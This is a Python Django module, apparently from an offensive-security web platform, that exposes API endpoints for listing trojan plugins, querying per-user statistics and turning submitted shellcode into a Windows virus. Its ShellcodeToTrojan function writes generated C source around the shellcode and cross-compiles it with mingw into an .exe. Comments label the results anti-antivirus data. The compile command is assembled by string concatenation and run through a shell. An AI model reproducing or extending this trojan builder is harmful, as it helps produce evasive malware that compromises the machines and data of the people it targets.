#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import time
import json
import sys
import os
import yaml
from ClassCongregation import ErrorLog,GetTempFilePath,GetTrojanFilePath,GetTrojanModulesFilePath
from Web.WebClassCongregation import UserInfo,TrojanData
from Web.TrojanOrVirus.GenerateTrojanFiles import CreateTrojanFiles
from django.http import JsonResponse
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
from ClassCongregation import randoms
from Web.celery import app
@app.task
def CompileCode(Command):#代码编译处理函数
    p = subprocess.call(Command, shell=True)  # 执行生成命令
    Status=""
    if p==0:#执行成功
        Status="1"
    else:
        Status="-1"
    TrojanData().UpdateStatus(compilation_status=Status,redis_id=CompileCode.request.id)  # 任务结束后更新状态

def ReadKeyValue(FileName):#供读取键值使用
    Result={}#存放读取结果
    Method=[]#存放插件的内容
    f= open(FileName, 'r')
    Temp = yaml.load(f.read(),Loader=yaml.FullLoader)
    Rules=Temp.get("rules")
    for i in Rules:
        Method.append(i.get("name"))
    Result[Temp.get("name")]=Method
    return Result


"""get_trojan_plugins
{
	"token": "xxx"
}
"""
def GetTrojanPlugins(request):#获取用户当前木马插件
    RequestLogRecord(request, request_api="get_trojan_plugins")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                ModulesResult={}#存放全部插件数据
                UserOperationLogRecord(request, request_api="get_trojan_plugins", uid=Uid)
                TrojanModulesFilePath=GetTrojanModulesFilePath().Result()
                for i, j, k in os.walk(TrojanModulesFilePath):
                    for x in k:
                        if x[-4:]==".yml":#判断是否是yml文件
                            ModulesResult=dict(ModulesResult,**ReadKeyValue(TrojanModulesFilePath+x))#往最终结果中更新键值
                return JsonResponse({'message': ModulesResult, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetTrojanPlugins(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })




"""shellcode_to_virus
{
	"token": "xxx",
	"shellcode_type": "xxx",
	"shellcode":"\\xdb\\xdb\\xdb\\xdb\\xdb\\xdb",
	"trojan_modules":{"xx":["xx","xxx"],"xx2":["xx2","xxx2"]}
}
"""

def ShellcodeToTrojan(request):#shellcode转换生成病毒
    RequestLogRecord(request, request_api="shellcode_to_virus")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Shellcode = json.loads(request.body)["shellcode"]#shellcode字符串
            ShellcodeType = json.loads(request.body)["shellcode_type"] #用来辨别MSF 还是CS
            TrojanModules = json.loads(request.body)["trojan_modules"]  # 模块合集
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="shellcode_to_virus", uid=Uid)
                TempFilePath = GetTempFilePath().Result()  # temp文件路径
                RandomName = randoms().EnglishAlphabet(5) + str(int(time.time()))  # 随机名称
                VirusOriginalFilePath = TempFilePath + RandomName + ".c"  # 病毒原始文件名
                VirusFileStoragePath = GetTrojanFilePath().Result()  # 病毒文件存放路径
                VirusFileGenerationPath = VirusFileStoragePath + RandomName + ".exe"  # 病毒文件生成路径
                if sys.platform == "win32":
                    pass#windows的暂时没测试
                elif sys.platform == "linux":
                    CFile = open(VirusOriginalFilePath, "w+")
                    CFile.write(CreateTrojanFiles(shellcode=Shellcode,trojan_modules=TrojanModules))#获取生成代码后写入文件中
                    CFile.close()
                    Command="i586-mingw32msvc-gcc -mwindows " + VirusOriginalFilePath + " -o " + VirusFileGenerationPath
                    RedisCompileCodeTask=CompileCode.delay(Command)
                    TrojanData().Write(uid=Uid,shellcode_type=ShellcodeType,virus_original_file_name=RandomName + ".c",virus_generate_file_name=RandomName + ".exe",compilation_status="0",redis_id=RedisCompileCodeTask.task_id)
                    return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
                else:
                    return JsonResponse({'message': "你的电脑不是Windows或者Linux无法使用该功能ლ(•̀ _ •́ ლ)", 'code': 600, })
            else:
                return JsonResponse({'message': "小宝贝这是非法请求哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""trojan_data_query
{
	"token": "xxx",
	"number_of_pages":"20"
}
"""

def TrojanDataQuery(request):#个人用户免杀数据查询
    RequestLogRecord(request, request_api="trojan_data_query")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            NumberOfPages = json.loads(request.body)["number_of_pages"]  # 页数
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="trojan_data_query", uid=Uid)
                AntiAntiVirusDataResult = TrojanData().Query(uid=Uid,number_of_pages=NumberOfPages)  # 获取当前用户的个数
                return JsonResponse({'message': AntiAntiVirusDataResult, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_TrojanDataQuery(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""trojan_data_statistical
{
	"token": "xxx"
}
"""

def TrojanDataStatistical(request):#个人用户数据统计
    RequestLogRecord(request, request_api="trojan_data_statistical")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="trojan_data_statistical", uid=Uid)
                Number=TrojanData().StatisticalData(uid=Uid)#获取当前用户的个数
                return JsonResponse({'message': Number, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_TrojanDataStatistical(def)", e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })